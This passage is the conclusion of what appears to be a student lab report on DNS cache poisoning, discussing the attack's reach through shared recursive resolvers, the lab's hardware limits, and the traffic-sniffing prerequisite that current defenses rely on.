\n\n\x0c5. CONCLUSION \n\n \n\nIn conclusion, we can say that the DNS cache poisoning attack is very powerful \n\nsince it allows to affect a big number of users  through a single attack. This is \n\ndue  to  the  fact  that  usually  many  clients  refer  to  the  same  Recursive  DNS \n\nServer. \n\nOur lab did not accurately show this feature due to the low capacity of the PCs \n\nof  the  laboratory  in  supporting  a  larger  number  of  VMs,  in  fact  we  had  the \n\nvictim on the same IP address of the attacker. However, if we added new users \n\nwho  request  that  particular  record  to  the  poisoned  server,  they  would  have \n\nbeen victim of the attack too. \n\nBesides the strength of the DNS cache poisoning, we have seen that defenses \n\nexist in order to vanish it. These defenses rely on the fact that an attacker has \n\nnot  enough  computational  power  and  network  capacity.  In  the  future,  this \n\ncould  no  longer  hold.  Today,  though,  a  key  prerequisite  for  an  attacker  who \n\nwants to perform such an attack is to have access to the network traffic, with \n\nthe purpose of sniffing \xe2\x80\x9cTransaction ID\xe2\x80\x9d and \xe2\x80\x9cUDP port\xe2\x80\x9d of the DNS requests. \n\n\x0c'